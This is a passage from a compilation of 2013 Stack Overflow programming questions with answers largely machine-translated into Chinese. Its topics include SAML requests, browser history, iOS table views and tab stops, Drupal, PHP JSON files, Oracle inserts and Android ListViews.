        nameIDPolicy.setFormat("urn:oasis:names:tc:SAML:2.0:nameid-format:transient");
        authnRequest.setNameIDPolicy(nameIDPolicy);

        RequestedAuthnContext requestedAuthnContext = buildSamlObject(RequestedAuthnContext.DEFAULT_ELEMENT_NAME,RequestedAuthnContextBuilder.class);
        requestedAuthnContext.setComparison(AuthnContextComparisonTypeEnumeration.MINIMUM);

        AuthnContextClassRef authnContextClassRef = buildSamlObject(AuthnContextClassRef.DEFAULT_ELEMENT_NAME,AuthnContextClassRefBuilder.class);
        authnContextClassRef.setAuthnContextClassRef("urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport");

        requestedAuthnContext.getAuthnContextClassRefs().add(authnContextClassRef);
        authnRequest.setRequestedAuthnContext(requestedAuthnContext);
    }

    String samlRequestStr = XMLUtil.doc2String( authnRequest.getDOM() );
    byte[] samlRequest = samlRequestStr.getBytes();  // <samlp:AuthnRequest>

    ByteArrayOutputStream bout = new ByteArrayOutputStream(500);
    Base64.encode(samlRequest,bout);

    return
        "<html><body>"
        +"<form method=\"post\" action=\"https://idp.example.org/SAML2/SSO/POST\">"
            +"  <input type=\"hidden\" name=\"SAMLRequest\" value=\""+ bout.toString() +"\" />"
//                +"  <input type=\"hidden\" name=\"RelayState\" value=\"someToken\" />"
            +"  <input type=\"submit\" value=\"Submit\" />"
            +" </form>"
        +"<body></html>";
}

private <SAMLObjectType extends SAMLObject, BuilderT extends SAMLObjectBuilder<SAMLObjectType>> SAMLObjectType buildSamlObject(javax.xml.namespace.QName defaultElementName, Class<BuilderT> type) {
    XMLObjectBuilderFactory builderFactory = org.opensaml.Configuration.getBuilderFactory();
    BuilderT requestBuilder = (BuilderT)builderFactory.getBuilder(defaultElementName);
    return requestBuilder.buildObject();
} 
```

I'll need to change the action to point to the actual identity provider. Beyond that, what am I supposed to put into the Request object? All I need is for the identity provider to verify that the user is a real user (they'll login with email and password at the identity provider) and then communicate to me what their email address is along with some sort of signature that I can validate to prove that the user has been validated by the identity provider.

All other information about the user is stored locally, so email and idp signature is all I need.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T08:00:23.570

saml 请求必须包含一些内容。它通常也必须签名。[这](https://blog.samlsecurity.com/search?s=authnrequest)是我写的关于如何使用 OpenSAML 创建 Authn SAML 请求的博客文章

我还有一本书，[A Guide to OpenSAML](https://blog.samlsecurity.com/a-guide-to-opensamlv3.html)，它很好地介绍了 SAML 和 OpenSAML 库。

# javascript - Let user navigate to new URL manually, within the same site, and not refresh the page

> ID：15510920
> 
> 赞同：0
> 
> 时间：2013-03-19T21:36:27.613
> 
> 标签：javascript, html

For a new web app I would like to modify history when users click on a link, so that the URL changes, but the page does not reload. I'll have some part of the page load in ajax. This can be done easily and is documented in a lot of places (e.g. [Mozilla](https://developer.mozilla.org/en-US/docs/DOM/Manipulating_the_browser_history), [diveintohtml5](http://diveintohtml5.info/history.html), [Stack Overflow](https://stackoverflow.com/questions/824349/modify-the-url-without-reloading-the-page)).

However, I'm wondering if there's a way to let the user modify the URL without reloading the page. Say for example someone gives them a link within the same domain, or they want to manually type the URL for some reason. I'd like to load the new page in the same way as I would if they had clicked a link - without reloading the page but rather modifying the history.

Is there any way to do this? Here's the gist of what I was thinking, but the magic functions `getNewURLFromEvent`, `preventUserFromActuallyLeavingPage`, and `carryOn` need to be implemented (if possible):

```
window.addEventListener('unload', function(event) {
    var newURL = getNewURLFromEvent(event);

    if (isInThisDomain(newURL)) {
        preventUserFromActuallyLeavingPage();
        window.history.pushState('content', 'title', document.URL);
    } else {
        // Let the user leave (the internet is a free place after all)
        carryOn();
    } 
});

function isInThisDomain(URL) {
    /* Would probably implement some error checking here too */
    var thisDomain = document.URL.match(/:\/\/(.+?)\//)[1],
        thatDomain = URL.match(/:\/\/(.+?)\//)[1]);

    return thisDomain === thatDomain;
}

function getNewURLFromEvent(e) {
    /* Figure out where the user want's to go */
}

function preventUserFromActuallyLeavingPage() {
    /* Since we're changing the content it still looks
        like the user's leaving, but really they haven't
        gone anywhere from the site's perspective */
}

function carryOn() {
    /* Essentially do nothing, but maybe more magic is needed? */
} 
```

If you feel this is a bad idea - yet still possible - please explain *why* it's a bad idea.

Thank you.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T21:43:49.167

地址栏的值的任何更改，除了使用 URL 哈希，都会指示浏览器转到该位置。你不能（也不应该）改变这种行为。这将打开一大堆关于 URL 伪装和其他恶意软件的蠕虫。

# javascript - Make image randomly move onclick

> ID：15510922
> 
> 赞同：5
> 
> 时间：2013-03-19T21:36:39.140
> 
> 标签：javascript, html, css, image, move

I am attempting to make a image move randomly using plain javascript. Upon the event onclick the image location should move according to the random number that is generated.

Here is my code:

```
<html>
<head><title> Move Image </title>

<style type="text/css">
#smiley { position: relative; top: 0px; left: 0px; }
</style>

<script type="text/javascript">

function changeImg()
{
var x = Math.floor(Math.random()*300);
var y = Math.floor(Math.random()*300);

var obj = document.getElementById("emotion");

obj.style.top = x + "px";
obj.style.left = y + "px";

 obj.onclick= "changeImg();"
 }

</script>
</head>
<body>
<img id="emotion" 
src="http://www.google.com/images/srpr/logo4w.png" 
width="42" height="42">
</body>
</html> 
```

Any idea? Thank you!

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-06-20T13:41:07.753

这个在所有浏览器中都可以在没有内联脚本的情况下工作

[Codepen 演示](http://codepen.io/ronnidc/pen/WvZJBr)

```
var object = document.getElementById('item');

object.onclick=function(){
    var x = Math.floor(Math.random()*300);
    var y = Math.floor(Math.random()*300);
    object.style.top = x + 'px';
    object.style.left = y + 'px';
}; 
```

HTML

```
<img id="item" src="http://...png" /> 
```

CSS

```
#item { 
  cursor: pointer;
  position: absolute; 
  top: 0px; 
  left: 0px; 
  transition: all 1s;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T21:39:40.780

*   你永远不会分配`changeImg()`给`<img>`

    ```
    <img ... onclick="changeImg()"> 
    ```

*   `position: absolute`如果您打算使用`top`and ，则该元素必须是`left`。

*   该`<img>`标签的 ID 为`emotion`，而不是`smiley`。

*   您不需要在每次调用函数时都设置`<img>`'属性。一次就够了。`onclick``changeImg()`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-19T21:42:13.440

您永远不会设置图像对象的位置。相反，您将“笑脸”设置为相对，但图像是“情感”。

尝试

```
#emotion{ position: relative; top: 0px; left: 0px; } 
```

我建议您调用函数而不是字符串文字。例子：

```
obj.onclick = changeImg; 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2016-09-25T21:26:09.673

```
<html>
<head><title> Move Image </title>

<style type="text/css">
#emotion { position: absolute; top: 0px; left: 0px; border:1px solid red;}
</style>

<script type="text/javascript">

function changeImg()
{
var x = Math.floor(Math.random()*300);
var y = Math.floor(Math.random()*300);

var obj = document.getElementById("emotion");

obj.style.top = x + "px";
obj.style.left = y + "px";

 }

</script>
</head>
<body>
<img id="emotion" 
src="http://www.google.com/images/srpr/logo4w.png" 
width="150" height="42" onclick="changeImg()"/>
</body>
</html> 
```

# wpf - How to remove the dots in Wpf Chart which is using Data Visualzation tool kit dll

> ID：15510924
> 
> 赞同：2
> 
> 时间：2013-03-19T21:36:41.240
> 
> 标签：wpf, mvvm, data-visualization, datavisualization.toolkit

I am working MVVM & Wpf Application, in that I am developing a chart using Data visualization tool kit Chart Line series...

This is my Xaml Code..

 *```
xmlns:chartingToolkit="clr-namespace:System.Windows.Controls.DataVisualization.Charting; assembly=System.Windows.Controls.DataVisualization.Toolkit"

    <chartingToolkit:Chart>
         <chartingToolkit:LineSeries
                 DataContext="{Binding}"
                 DependentValueBinding="{Binding Path=y}"                 
                 IndependentValueBinding="{Binding Path=x}" 
                 ItemsSource="{Binding Path=Data}" >
         </chartingToolkit:LineSeries>
         <chartingToolkit:Chart.Axes>
            <chartingToolkit:LinearAxis ShowGridLines="False" Orientation="X" Interval="0">
            </chartingToolkit:LinearAxis>
            <chartingToolkit:LinearAxis ShowGridLines="False" Orientation="Y" Interval="0">
            </chartingToolkit:LinearAxis>
       </chartingToolkit:Chart.Axes>
    </chartingToolkit:Chart> 
```*  *I am able to display my chart, but the problem is how to hide dots. (I marked them with pink Circle in the picture (graph/ chart))

![enter image description here](../Images/56353918f0a8f090cb1cbd200dc3b8a7.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-07-18T19:53:15.467

您必须设置不透明度 = 0 的样式

```
<Style x:Key="LineDataPointStyle" TargetType="{x:Type chartingToolkit:LineDataPoint}">
    <Setter Property="Background" Value="Blue" ></Setter>
    <Setter Property="Opacity" Value="0" />
</Style>

<chartingToolkit:LineSeries
    Title="Line"
    ItemsSource="{Binding}"
    IndependentValuePath="Int"
    DependentValuePath="LineValue"
    DataPointStyle="{StaticResource LineDataPointStyle}"/> 
```*

# uitableview - 删除时tableview内部不一致

> ID：15510928
> 
> 赞同：0
> 
> 时间：2013-03-19T21:36:50.397
> 
> 标签：uitableview, ios6

我有一个带有一组地址的数组（数据源），我的表格视图设置为数据源中单元格数量的两倍，因此我可以将奇数单元格设置为小而清晰的样式（使表格视图看起来像单元格是分开的由一个小空间）。删除行时出现问题，我执行以下操作：

```
-(void)tableView:(UITableView *)tableView commitEditingStyle:(UITableViewCellEditingStyle)editingStyle forRowAtIndexPath:(NSIndexPath *)indexPath{
[tableView beginUpdates];
if (editingStyle==UITableViewCellEditingStyleDelete) {
        [self DeleteAddress:[ListAddress objectAtIndex:indexPath.row/2]];

        [ListAddress removeObjectAtIndex: indexPath.row/2];
        NSIndexPath *nextIndexPath = [[NSIndexPath alloc] initWithIndex:indexPath.row+1];

        [tableView deleteRowsAtIndexPaths:[NSArray arrayWithObjects:indexPath,nextIndexPath,nil] withRowAnimation:UITableViewRowAnimationRight];
    }else if (editingStyle == UITableViewCellEditingStyleInsert){
         [self tableView:tableView didSelectRowAtIndexPath:indexPath];

    }
[tableView endUpdates];
} 
```

DeleteAddress 方法从数据库中删除地址。当调试器到达 [tableview endUpdate] 函数时，会出现以下错误：

```
*** Assertion failure in -[UITableView _endCellAnimationsWithContext:], /SourceCache/UIKit_Sim/UIKit-2380.17/UITableView.m:1070
NSInternalInconsistencyException 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T03:53:18.077

只需按照示例代码。从您的数据源中删除一行。希望它对您有用。此代码适用于我的应用程序。试试看

```
//  Swipe to delete has been used.  Remove the table item

- (void)tableView:(UITableView *)tableView commitEditingStyle:(UITableViewCellEditingStyle)editingStyle forRowAtIndexPath:(NSIndexPath *)indexPath
{
    if (editingStyle == UITableViewCellEditingStyleDelete)
    {
        //  Get a reference to the table item in our data array
        Pictures *itemToDelete = [self.pictureListData objectAtIndex:indexPath.row];

        //  Delete the item in Core Data
        [self.managedObjectContext deleteObject:itemToDelete];

        //  Remove the item from our array
        [pictureListData removeObjectAtIndex:indexPath.row];

        //  Commit the deletion in core data
        NSError *error;
        if (![self.managedObjectContext save:&error])
            NSLog(@"Failed to delete picture item with error: %@", [error domain]);

        // Delete the row from the data source
        [tableView deleteRowsAtIndexPaths:[NSArray arrayWithObject:indexPath] withRowAnimation:UITableViewRowAnimationFade];
    }   
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T14:33:25.703

我的问题是我以错误的方式创建了 nextIndexPath 变量。它应该是这样的：

```
NSIndexPath *nextIndexPath = [NSIndexPath indexPathForRow:indexPath.row+1 inSection:indexPath.section]; 
```

另外我不能同时删除两行，我需要从底部分别删除它们：

```
[tableView deleteRowsAtIndexPaths:[NSArray arrayWithObject:nextIndexPath] withRowAnimation:UITableViewRowAnimationRight];
[tableView deleteRowsAtIndexPaths:[NSArray arrayWithObject:indexPath] withRowAnimation:UITableViewRowAnimationRight]; 
```

# windows - 在windows平台上为powerPC提取和检测elf文件

> ID：15510932
> 
> 赞同：2
> 
> 时间：2013-03-19T21:37:03.413
> 
> 标签：windows, elf, instrumentation, extraction, powerpc

我正在尝试从 elf 文件中提取函数名称及其参数等信息，目的是通过更改函数的参数值来执行稳健性测试，我正在使用 windows 环境，我想要检测的 elf 文件用于 powerPC 架构，我尝试使用可以在 MS Visual Studio 上构建的开源工具 DynInst [http://www.dyninst.org/](http://www.dyninst.org/)，但它使用 cl 编译器（exe 和 dll 格式）编译的二进制文件，我有以下问题要提出：

1）是否可以使用 Microsoft Visual Studio C++ 编译器生成 elf 文件，以便我可以使用 DynInst 来检测二进制文件？

2）有没有其他方法或工具可以用来在windows平台上提取和检测elf文件？

objdump、readelf、nm 等提供了提取 elf 的功能，但我还需要对它们进行检测。我不知道如何定制这些实用程序以满足我的需求，任何建议都会有很大帮助！

/谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T04:02:01.607

> 1) 是否可以使用 Microsoft Visual Studio C++ 编译器生成 elf 文件

当然：`ELF`只是一种文件格式。就像您可以在 PowerPC/AIX 上编写 .zip 文件并在 SPARC/Solaris 和 x86/Windows 上读取它一样，您可以在任何操作系统上编写 ELF 文件。

> 以便我可以使用 DynInst 来检测二进制文件？

我不知道是否`DynInst`能够检测这样的文件。

> 是否有其他方法或工具可用于在 windows 平台上提取和检测 elf 文件？

您可以编译 GNU`binutils`包，其中包含`readelf`. `ELF`您可以使用它从文件中提取各种信息。

还有一个`libelf`库，允许您读取*和*写入 ELF 文件。是否`libelf`可以在Windows上构建没有太多麻烦，我不知道。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T16:55:24.280

无法使用 Visual Studio 编译器直接生成 ELF 二进制文件。Windows 二进制文件是 PE 格式，与 ELF 不兼容。通过编译*为*汇编语言并在生成的文件上运行脚本以从 PE 转换为 ELF，并使用 ELF 感知汇编器（如 gas , yasm, nasm) 来组装生成的文件。

此外，您将无法在 Windows 上执行 PowerPC 二进制文件，因为 Windows 不支持 PowerPC 体系结构。

如果 DynaInst 只是将挂钩插入到编译代码中，那么您应该使用交叉编译器来编译 DynaInst 库挂钩和您希望检测的二进制文件。

还有其他可用的工具，它们也应该在 Windows 上工作，例如`gprof`，它仅依赖于某些函数可用，这些函数用于检测函数调用。

# iphone - 如何将制表位添加到 NSAttributedString 并在 UITextView 中显示

> ID：15510936
> 
> 赞同：7
> 
> 时间：2013-03-19T21:37:17.640
> 
> 标签：iphone, core-text, nsattributedstring

我正在创建一个 iOS 应用程序，我想显示一个属性字符串，其中包含在 UITextView 中指定的特定制表位。我还想使用 drawRect 中的核心文本将它们直接绘制到 UIViews 中。我希望（如果可能）在两种情况下都使用相同的属性字符串。

因此，在我的应用程序中，我创建了一个 CFAttributedStringRef 或 NSAttributedString 并将 CTParagraphStyle 属性应用到它。然后，我尝试在 UITextView 中显示属性字符串，但出现如下崩溃：

```
-[__NSCFType headIndent]: unrecognized selector sent to instance 0x7545080

po 0x7545080
$0 = 122966144 CTParagraphStyle:
base writing direction = -1, alignment = 4, line break mode = 0, 
   default tab interval = 0
first line head indent = 0, head indent = 0, tail indent = 0
line height multiple = 0, maximum line height = 0, minimum line height = 0
line spacing adjustment = 0, paragraph spacing = 0, 
   paragraph spacing before = 0
tabs:
(
   "CTTextTab: location = 20, alignment = 0, options = (none)\n",
   "CTTextTab: location = 40, alignment = 0, options = (none)\n",
   "CTTextTab: location = 60, alignment = 0, options = (none)\n",
   "CTTextTab: location = 80, alignment = 0, options = (none)\n",
   "CTTextTab: location = 100, alignment = 0, options = (none)\n",
   "CTTextTab: location = 120, alignment = 0, options = (none)\n"
) 
```

我明白发生了什么，但我想知道我是否有其他方法可以做我想做的事情。iOS 上的 NSMutableParagraphStyle 不支持制表位，但我注意到 OS X 上的 NSMutableParagraphStyle 确实具有此功能。这让我认为 iOS NSMutableParagraphStyle 有一天可能会支持这一点。

同时，有没有办法将制表位添加到 CFAttributedStringRef 或 NSAttributedString 并且仍然有 UITextView 显示它？

有问题的来源是：

```
- (void)viewWillAppear:(BOOL)animated
{
   CFDictionaryRef attrs = (__bridge CFDictionaryRef) @{};
   CFAttributedStringRef a = CFAttributedStringCreate(
       kCFAllocatorDefault, CFSTR("a\tb\tc\td"), attrs);

   CFMutableAttributedStringRef attrStr;
   attrStr = CFAttributedStringCreateMutableCopy(
       kCFAllocatorDefault, CFAttributedStringGetLength(a), a);

   CFArrayRef tabStops = (__bridge CFArrayRef) @[
       (__bridge id) CTTextTabCreate(0, 20, NULL),
       (__bridge id) CTTextTabCreate(0, 40, NULL),
       (__bridge id) CTTextTabCreate(0, 60, NULL),
       (__bridge id) CTTextTabCreate(0, 80, NULL),
       (__bridge id) CTTextTabCreate(0, 100, NULL),
       (__bridge id) CTTextTabCreate(0, 120, NULL)];

   const CTParagraphStyleSetting paraSettings[] = {
       {kCTParagraphStyleSpecifierTabStops, sizeof(CFArrayRef), &tabStops},
   };

   CTParagraphStyleRef paraStyle = CTParagraphStyleCreate(
       paraSettings, 
       sizeof(paraSettings) / sizeof(CTParagraphStyleSetting));

   CFRange range = CFRangeMake(0, CFAttributedStringGetLength(attrStr));
   CFAttributedStringSetAttribute(
       attrStr, range, kCTParagraphStyleAttributeName, paraStyle);

   CFRelease(paraStyle);
   CFIndex i, count = CFArrayGetCount(tabStops);
   for (i = 0; i < count; i++) {
       CFRelease(CFArrayGetValueAtIndex(tabStops, i));
   }

   [[self textView] setAttributedText:
       (__bridge NSAttributedString *)(attrStr)];
} 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-09-22T20:58:04.170

在 iOS 7 中，您可以这样做：

```
UIFont *font = [UIFont systemFontOfSize:18.0];
NSMutableParagraphStyle *paragraphStyle = [[NSParagraphStyle defaultParagraphStyle] mutableCopy];
NSInteger cnt;
CGFloat tabInterval = 72.0;
paragraphStyle.defaultTabInterval = tabInterval;
NSMutableArray *tabs = [NSMutableArray array];
for (cnt = 1; cnt < 13; cnt++) {    // Add 12 tab stops, at desired intervals...
    [tabs addObject:[[NSTextTab alloc] initWithTextAlignment:NSTextAlignmentLeft location:tabInterval * cnt options:nil]];
}
paragraphStyle.tabStops = tabs;
NSDictionary *attributes = @{ NSFontAttributeName: font, NSParagraphStyleAttributeName: paragraphStyle}; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-12-10T21:21:33.523

这是对我有用的 Swift 版本：

```
 let tablInterval: CGFloat = 85.0
    let paragraphStyle = NSMutableParagraphStyle()
    let terms = NSTextTab.columnTerminatorsForLocale(NSLocale.currentLocale())
    let tabStop0 = NSTextTab(textAlignment: .Right, location: 0, options: [NSTabColumnTerminatorsAttributeName:terms])
    let tabStop1 = NSTextTab(textAlignment: .Right, location: tablInterval, options: [NSTabColumnTerminatorsAttributeName:terms])
    let tabStop2 = NSTextTab(textAlignment: .Right, location: tablInterval*2, options: [NSTabColumnTerminatorsAttributeName:terms])
    let tabStop3 = NSTextTab(textAlignment: .Right, location: tablInterval*3, options: [NSTabColumnTerminatorsAttributeName:terms])
    paragraphStyle.addTabStop(tabStop0)
    paragraphStyle.addTabStop(tabStop1)
    paragraphStyle.addTabStop(tabStop2)
    paragraphStyle.addTabStop(tabStop3)

    let attributedString = NSMutableAttributedString(string:text)
    attributedString.addAttribute(NSParagraphStyleAttributeName, value:paragraphStyle, range:rangeAll) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-02-10T00:46:37.340

**Swift 的改进/更正答案：**

```
let tablInterval: CGFloat = 20.0
var tabsArray = [NSTextTab]()
for i in 1...6 {
    tabsArray.append(NSTextTab(textAlignment: .Left, location: i*tabInterval, options: [:]))
}
let paraStyle = NSMutableParagraphStyle()
paraStyle.tabStops = tabsArray
textView.attributedString = NSAttributedString(string: text, attributes: [NSAttributedString.Key.ParagraphStyle: paraStyle]) 
```

**为什么这个额外的 Swift 答案？**

较早的 Swift 答案是有缺陷的，因为它在没有首先删除默认制表位的情况下添加了制表位（12 个左对齐制表位，间距为 28 pt）。因此，它将一组新的制表位添加到默认的制表位组，而不是用新的制表位组替换它们。使用基于该答案的代码让我非常沮丧，试图弄清楚为什么它对我不起作用，直到我回到[NSMutableParagraphStyle.tabStops 的文档](https://developer.apple.com/documentation/uikit/nsmutableparagraphstyle/1531988-tabstops)并阅读了有关默认制表位的信息：

> 默认值为 12 个以 28 点为间隔的左对齐制表符的数组。

这个答案纠正了这一点，并通过删除（不必要的？）“选项”以及使用循环（仅适用于所有选项卡的间距一致且所有选项卡都具有相同对齐类型的情况）变得更加简洁。

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2013-06-18T00:38:23.030

ios 6.1 添加了 NSParagraphStyle 但似乎 CTParagraphStyleRef 和 NSParagraphStyle 不是免费桥接。

结果，如果您在 NSAttributeString 中有 CTParagraphStyleRef ，则会导致：

[__NSCFType headIndent]：无法识别的选择器发送到实例 xxxx

以及 NSParagraphStyle 的其他方法，例如对齐。

# drupal - 如何创建显示两个特定节点的页面？

> ID：15510940
> 
> 赞同：0
> 
> 时间：2013-03-19T21:37:44.427
> 
> 标签：drupal, drupal-7, drupal-webform

我们想要创建一个显示两个特定节点的页面。

第一个节点将是本地化的内容（用户语言的文章节点）。该页面将至少有 5 种不同的语言版本。

第二个节点将是用户可以提交以“签署”文档的 Webform 节点。它将是语言中立的。

最初我认为我可以拥有一个 Webform 节点，然后将其翻译成适当的语言。但我发现 Webform 节点的“翻译”版本实际上是一个全新的节点——这意味着一个全新的 Webform。如果您考虑 Drupal 如何处理多语言内容，这是有道理的——每个翻译都是一个单独的节点。

但是对于我们的 webform，我们不想将提交分成 10 多个不同的 webform 提交集。每个“签名”的人都将他们的签名放入同一个数据“箱”中。

我可以想到两种可能的解决方案：

1.  创建一个将显示两个节点的页面：“文章”节点的本地化版本（根据用户的语言选择进行选择）和网络表单。

2.  创建多个 Webform 节点（每种语言一个），然后创建一个 MySQL 视图，将所有用户提交合并到一组记录中。这将使我们能够轻松地提取数据。

我不确定2是否可能。我假设我必须选择 1。但是，到目前为止，我为实现这一目标所做的努力也没有结果！我怎样才能做到这一点？

-乔什

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T04:52:55.033

我认为 1 是非常简单和可能的解决方案。您可以创建 webform 节点并将正文字段设置为 php 代码（为此您需要启用 php 过滤器）。并放入正文中：

```
<?php
$nid = NODE_ID;
$node = node_load($nid); 
$node_view = node_view($node, 'full'); 
print drupal_render($node_view);
?> 
```

只需将 NODE_ID 替换为多语言节点的 nid 即可。

# php - 将对象写入json文件？

> ID：15510941
> 
> 赞同：1
> 
> 时间：2013-03-19T21:37:45.333
> 
> 标签：php, file, validation, json

我有一个问题：我需要在文件中写入一些 json 格式的对象，但最终会产生一个有效的 json。现在用它们创建一个数组然后对它们进行编码会很简单，**但**问题是当某个事件被调度时，我将每个元素都放在不同的 .php 页面中，我需要将它们全部传递给一个**有效**的json。
有谁知道如何做到这一点？

* * *

编辑：
我拥有的是一个 Facebook 应用程序，我获取用户数据并将其写入 json 文件，但是对于大多数用户数据，我需要请求权限。此外，每个 .php 页面都用于一种类型的数据（一种用于群组，一种用于发布照片等），用户可以选择他/她想要在 json 中写入的数据。**进入应用时请求所有**权限并不是一个好主意，因为用户很可能会取消进入请求许多权限的应用。相反，每次用户选择向 json 添加更多数据时，我都会询问该类型数据的权限。
最后，当用户单击按钮时，我会将所有数据写入 json。我写一切`json_encode`

* * *

Edit2：我一直在考虑的一种方法是将所有数据写入json，打开它进行读取，全部更改`][`为`,`并写回json。但是，这可能是一种低效的方法，因为我的文件将在云上，并且打开和关闭文件可能会花费一些时间

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T21:54:08.887

您需要在此处提供更多信息，因为答案可能会根据您使用常规 PHP 或 OOP PHP 的以太网而改变。

*   在第二种情况下（OOP PHP），您可以创建一个全局数组并用正确的元素填充它，当（在您的代码中）您到达一个完整的对象时，您可以编写您的文件。
*   在第一种情况下（常规 PHP），我认为您可以使用隐藏输入并将变量从一个页面发布到另一个页面......

无论如何，示例代码都会提供有关您想要在此处实现的目标的更多信息，以便可以提供适当的帮助。
希望这有帮助。

# oracle-xe - 错误：插入多个值我收到此错误 ORA-00911：无效字符

> ID：15510943
> 
> 赞同：0
> 
> 时间：2013-03-19T21:37:48.180
> 
> 标签：oracle-xe

我是一名一年级远程学习学生，在构建数据库时遇到了问题。

我得到的错误是 ORA-00911: invalid character 当我执行以下操作时：

```
INSERT INTO ORDER_LINE
VALUES
('21608','AT94',11,21.95);
INSERT INTO ORDER_LINE
VALUES
('21610','DR93',1,495.00);
INSERT INTO ORDER_LINE
VALUES
('21610','DW11',1,399.99);
INSERT INTO ORDER_LINE
VALUES
('21613','KL62',4,329.95);
INSERT INTO ORDER_LINE
VALUES
('21614','KT03',2,595.00);
INSERT INTO ORDER_LINE
VALUES
('21617','BV06',2,794.95);
INSERT INTO ORDER_LINE
VALUES
('21617','CD52',4,150.00);
INSERT INTO ORDER_LINE
VALUES
('21619','DR93',1,495.00);
INSERT INTO ORDER_LINE
VALUES
('21623','KV29',2,1290.00); 
```

我注意到，当我一一插入值时，一切似乎都很好。当我想一次插入多个值时，会以某种方式出现问题。

论坛有很多类似的问题，但因为我是菜鸟，所以我看不出我哪里出错了。我已经重新输入了所有内容，因为虽然我可能在某个地方犯了错误，但仍然遇到这个问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-11-15T15:28:19.457

我在使用 Toad 到 Oracle 10g 时遇到了同样的问题。您必须将插入查询放在 BEGIN 和 END 之间：

```
BEGIN
INSERT INTO ORDER_LINE VALUES ('21608','AT94',11,21.95);
INSERT INTO ORDER_LINE VALUES ('21610','DR93',1,495.00);
END; 
```

# c# - 实施像 Management Studio 这样的行为

> ID：15510945
> 
> 赞同：0
> 
> 时间：2013-03-19T21:37:55.007
> 
> 标签：c#, sql-server, asynchronous

我正在开发一个应用程序，它显示由大量预定义查询产生的数据......

我想知道如何让我的界面复制管理工作室的行为。我的意思是我想像管理工作室一样显示查询结果：逐个（除非定义了一些“order by”子句）......

使用[BeginExecuteReader](http://msdn.microsoft.com/en-us/library/7szdt0kc.aspx)使代码异步，但在所有结果都存在之前不会使 Reader 可用...与[comm.ExecuteReaderAsync相同](http://msdn.microsoft.com/en-us/library/hh204836.aspx)

[这里的这个问题](https://stackoverflow.com/questions/13045481/streaming-read-of-over-10-million-rows-from-a-table-in-sql-server)看起来与我想要的相似，但那个人接受了一个非常可疑的答案......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T17:07:30.883

在将我的源代码与提供的代码进行比较后，我注意到在我的连接字符串中缺少“异步处理=真”......添加它后一切恢复正常......

# javascript - 更改顺序 js 将文本插入 html

> ID：15510950
> 
> 赞同：0
> 
> 时间：2013-03-19T21:38:07.230
> 
> 标签：javascript, css, html

我需要更改 js 将文本插入到 html 中的位置，目前它总是放在最后，我需要它在开头插入它并将其他文本向下推。也就是说，如果它插入

```
<li>1</li>, <li>2</li>, <li>3</li> 
```

它会保持这个顺序我需要最后一个总是首先列出

```
<li>3</li>, <li>2</li>, <li>1</li> 
```

这是html

```
<div class="data">
    <div class="stackleft" id="p1_stack"></div>
    <div class="stackright" id="p2_stack"></div>
</div> 
```

这是JavaScript

```
function drawStack(isFinal) {
    var stackLength = Oscore[currentPlayer].stack.length;
    var temp = "";
    var tot = 0;
    for (var i = 0; i < stackLength; i++) {
        var val = Oscore[currentPlayer].stack[i];
        temp += "<li>" + val + "</li>";
        tot += val;
    }

    //if(!isFinal){
    //temp = '<div class="workingScore">'+scoreTemp+'</div><br>' + temp;
    //}

    var writeSore = document.form1.game.value - tot;
    writeit(writeSore, currentPlayer + "_score");
    writeit(temp, currentPlayer + "_stack");
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T21:45:04.460

尝试向后循环：

```
for (var i = stackLength; i--; ) {
    var val = Oscore[currentPlayer].stack[i];
    temp += "<li>" + val + "</li>";
    tot += val;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T21:42:16.603

这个怎么样：

```
temp = "<li>" + val + "</li>" + temp; 
```

您在显示的代码中也缺少引用（现在由某人的编辑修复），可能根本不会像最初写的那样工作。

编辑：我认为我更喜欢循环向后的方法，但这取决于你认为最清楚的内容。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-19T21:43:03.437

从 JQuery使用`prepend()`.....

# android - 向 ListView 的 TextView 添加标签？

> ID：15510951
> 
> 赞同：1
> 
> 时间：2013-03-19T21:38:07.283
> 
> 标签：android, listview, nullpointerexception, textview, android-viewbinder

我正在编写我教会的 Android 应用程序，我正在尝试使用 ListView 作为启动板来在线查看布道。LV 正确填充，但每个列表项中有两个 TextView 不是由光标填充的 - 它们在每个列表项中具有相同的文本。（准确地说，他们说“播放音频”和“播放视频”。）我需要一种方法来单击每个 TextView 并被发送到某个网页。我正在尝试向每个 TextView 添加标签，但是当我尝试从我的 ViewBinder 访问它们时，我得到了 NullPointerException。标签都有不同的值。

有谁知道我如何为这些静态 TextViews 分配标签？

**SermonActivity.java**

```
 public class SermonActivity extends SherlockListActivity implements
        OnClickListener, ViewBinder {

    private Cursor cursor = null;
    private SimpleCursorAdapter adapter = null;
    private dbAdapter dba = null;
    private ListView listView = null;

    // Arrays
    private static String[] FROM = { "title", "scripture", "speaker", "mdy",
            "hour" };
    private static int[] TO = { R.id.sermon_title, R.id.sermon_scripture,
            R.id.sermon_speaker, R.id.sermon_date, R.id.sermon_time };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_sermon);

        ActionBar actionBar = getSupportActionBar();

        // Makes home button visible
        actionBar.setHomeButtonEnabled(true);

        // Allows home button to be used to navigate up
